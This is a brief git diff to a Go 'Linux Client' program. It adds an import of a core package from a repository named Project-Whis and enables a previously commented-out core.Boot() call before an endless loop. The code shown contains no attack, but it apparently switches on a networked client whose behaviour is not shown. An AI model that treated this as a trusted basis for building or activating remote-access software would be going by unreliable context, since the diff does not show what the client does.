@@ -4,6 +4,8 @@ import (
 	"fmt"
 	"math/rand"
 	"time"
+
+	"github.com/SaturnsVoid/Project-Whis/Clients/HTTPS/Linux/core"
 )
 
 func init() {
@@ -11,7 +13,7 @@ func init() {
 }
 func main() {
 	fmt.Println("Linux Client")
-	//core.Boot()
+	core.Boot()
 	for {
 		time.Sleep(15 * time.Millisecond)
 	}
